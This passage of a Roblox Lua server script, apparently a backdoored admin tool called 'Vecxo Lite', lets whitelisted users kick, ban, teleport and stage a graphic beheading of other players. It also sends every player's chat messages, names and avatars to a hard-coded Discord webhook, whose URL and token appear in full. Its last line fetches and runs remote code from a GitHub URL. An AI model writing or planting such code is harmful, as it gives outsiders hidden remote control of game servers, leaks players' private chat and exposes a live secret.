				leftPole.Size = Vector3.new(1, 12, 1)
				leftPole.Position = base.Position + Vector3.new(-4, 6, 0)
				leftPole.Material = Enum.Material.Wood
				leftPole.BrickColor = BrickColor.new("Reddish brown")
				leftPole.Anchored = true

				local rightPole = Instance.new("Part", workspace)
				rightPole.Name = "DIZZY behead moment"
				rightPole.Size = Vector3.new(1, 12, 1)
				rightPole.Position = base.Position + Vector3.new(4, 6, 0)
				rightPole.Material = Enum.Material.Wood
				rightPole.BrickColor = BrickColor.new("Reddish brown")
				rightPole.Anchored = true

				local crossbar = Instance.new("Part", workspace)
				crossbar.Name = "DIZZY behead moment"
				crossbar.Size = Vector3.new(10, 1, 1)
				crossbar.Position = base.Position + Vector3.new(0, 12, 0)
				crossbar.Material = Enum.Material.Wood
				crossbar.BrickColor = BrickColor.new("Reddish brown")
				crossbar.Anchored = true

				local blade = Instance.new("Part", workspace)
				blade.Name = "DIZZY behead moment"
				blade.Size = Vector3.new(2, 2, 0.2)
				blade.Position = crossbar.Position + Vector3.new(0, -1, 0)
				blade.Material = Enum.Material.Metal
				blade.BrickColor = BrickColor.new("Dark stone grey")
				blade.Anchored = true

				local rope = Instance.new("Part", workspace)
				rope.Name = "DIZZY behead moment"
				rope.Size = Vector3.new(0.1, 2, 0.1)
				rope.Position = blade.Position + Vector3.new(0, 1, 0)
				rope.Material = Enum.Material.Rock
				rope.BrickColor = BrickColor.new("Burnt Sienna")
				rope.Anchored = true

				rootPart.CFrame = base.CFrame * CFrame.new(0, 1.5, 0) * CFrame.Angles(math.rad(90), 0, 0)
				rootPart.Anchored = true

				if humanoid:FindFirstChild("Animator") then
					humanoid.Animator:Destroy()
				end

				for i = 1, 10 do
					blade.Position = blade.Position + Vector3.new(0, -0.5, 0)
					rope.Size = Vector3.new(0.1, 2 + (i * 0.5), 0.1)
					rope.Position = rope.Position + Vector3.new(0, -0.3, 0)
					task.wait(0.1)
				end

				local neck = torso:FindFirstChild("Neck")
				if neck then
					neck:Destroy()
				end

				head.CFrame = blade.CFrame * CFrame.new(0, -1, 0)
				head.Anchored = true

				local newhead = head:Clone()
				newhead.CFrame = blade.CFrame * CFrame.new(0, -1, 0)
				newhead.Anchored = true
				newhead.Parent = workspace

				local blood = Instance.new("Part", workspace)
				blood.Name = "DIZZY behead moment"
				blood.Size = Vector3.new(2, 0.2, 2)
				blood.Position = head.Position + Vector3.new(0, -4.3, 0)
				blood.Material = Enum.Material.SmoothPlastic
				blood.BrickColor = BrickColor.new("Bright red")
				blood.Anchored = true
				blood.Transparency = 0.5

				task.delay(5, function()
					if rootPart then rootPart.Anchored = false end
					if head then head.Anchored = false end
				end)

				plr.CharacterAdded:Connect(function(newCharacter)
					task.wait(1)
					local newHumanoidRootPart = newCharacter:FindFirstChild("HumanoidRootPart")
					if newHumanoidRootPart then
						newHumanoidRootPart.Anchored = false
					end
				end)
			end
		end

	elseif cmd == "!kick" and args[2] then
		local reason = msg:match("^!kick%s+%S+%s+(.+)$")
		local targets = GetPlayers(args[2], sender)
		if #targets == 0 then
			notifyv2(sender, "[Vecxo Lite]", "Player(s) '" .. args[2] .. "' not found.")
			return
		end
		for _, targetPlayer in ipairs(targets) do
			if reason then
				targetPlayer:Kick("[Vecxo Lite]: Kicked by " .. sender.Name .. ": " .. reason)
				notifyv2(sender, "[Vecxo Lite]", "✅ Kicked " .. targetPlayer.Name)
			else
				targetPlayer:Destroy()
				notifyv2(sender, "[Vecxo Lite]", "✅ Kicked " .. targetPlayer.Name)
			end
		end
	elseif cmd == "!unban" and args[2] then
		local plr = args[2]
		local success, plrid = pcall(function()
			return game.Players:GetUserIdFromNameAsync(plr)
		end)

		if not success then
			notifyv2(sender, "Vecxo's admin", "Failed to get UserId — is the name correct?")
			return
		end

		if bannedPlayers[plrid] then
			bannedPlayers[plrid] = nil
			notifyv2(sender, "[Vecxo Lite]","✅ ".. plr .. " has been unbanned successfully.")
		else
			notifyv2(sender, "[Vecxo Lite]","❌ ".. plr .. " is not currently banned.")
		end


	elseif cmd == "!ban" and args[2] then
		local reason = msg:match("^!ban%s+%S+%s+(.+)$")
		local targets = GetPlayers(args[2], sender)
		if #targets == 0 then
			notifyv2(sender, "[Vecxo Lite]", "❌ Player(s) '" .. args[2] .. "' not found.")
			return
		end
		for _, targetPlayer in ipairs(targets) do
			bannedPlayers[targetPlayer.UserId] = true
			if reason then
				targetPlayer:Kick("[Vecxo Lite]: Banned by " .. sender.Name .. ": " .. reason)
				notifyv2(sender, "[Vecxo Lite]", "✅ Banned " .. targetPlayer.Name)
			else
				bannedPlayers[targetPlayer.UserId] = true
				targetPlayer:Destroy()
				notifyv2(sender, "[Vecxo Lite]", "✅ Banned " .. targetPlayer.Name)
			end
		end
	elseif cmd == "!rj" and args[2] then
		local targets = GetPlayers(args[2], sender)
		if #targets == 0 then
			notifyv2(sender, "[Vecxo Lite]", "❌ Player(s) '" .. args[2] .. "' not found.")
			return
		end
		local TeleportService = game:GetService("TeleportService")
		local placeId = game.PlaceId
		local jobId = game.JobId
		for _, targetPlayer in ipairs(targets) do
			notifyv2(sender, "[Vecxo Lite]", "✅ Rejoining " .. targetPlayer.DisplayName)
			TeleportService:TeleportToPlaceInstance(placeId, jobId, targetPlayer)
		end

	elseif cmd == "!h" then
		local announcement = msg:sub(4)
		for _, plr in ipairs(Players:GetPlayers()) do
			notify(plr, "[Vecxo Lite]", announcement)
		end
	end
end

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local WEBHOOK_URL = "https://discord.com/api/webhooks/1400166689936642160/2zjPtgbfhR96A1QJmI0yZEUIx3cCHcsGzWuYficN-RFzae6ZvJaumb_ZrgfozIm2rmpZ"

local function sanitizeMessage(msg)
	msg = msg:gsub("@here", "@\u{200B}here")
	msg = msg:gsub("@everyone", "@\u{200B}everyone")
	return msg
end

local function getAvatarURL(userId)
	return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
end

local function connectChatLogger(player)
	local avatarUrl = getAvatarURL(player.UserId)

	player.Chatted:Connect(function(message)
		local safeMessage = sanitizeMessage(message)

		local payload = {
			username = player.Name .. " (@" .. player.DisplayName .. ")",
			content = safeMessage,
			avatar_url = avatarUrl
		}

		local success, response = pcall(function()
			HttpService:PostAsync(
				WEBHOOK_URL,
				HttpService:JSONEncode(payload),
				Enum.HttpContentType.ApplicationJson
			)
		end)

		if not success then
			warn("Failed to send message to Discord:", response)
		end
	end)
end

for _, player in ipairs(Players:GetPlayers()) do
	coroutine.wrap(function()
		connectChatLogger(player)
	end)()
	if table.find(whitelisted, tostring(player.UserId)) then
		notify(player, "[Vecxo Lite]:", "You are whitelisted! Usage: !cmds")
	end
	player.Chatted:Connect(function(message)
		processCommand(player, message)
	end)
end

Players.PlayerAdded:Connect(function(player)
	coroutine.wrap(function()
		connectChatLogger(player)
	end)()
	if bannedPlayers[player.UserId] then
		player:Kick("[Vecxo Lite]: You are banned from this server.")
		return
	end
	if table.find(whitelisted, tostring(player.UserId)) then
		notifyv2(player, "[Vecxo Lite]:", "You are whitelisted! Usage: !cmds")
	end
	player.Chatted:Connect(function(message)
		processCommand(player, message)
	end)
end)

loadstring(game:GetService('HttpService'):GetAsync('https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/VecxoRemoteAPI'))() 

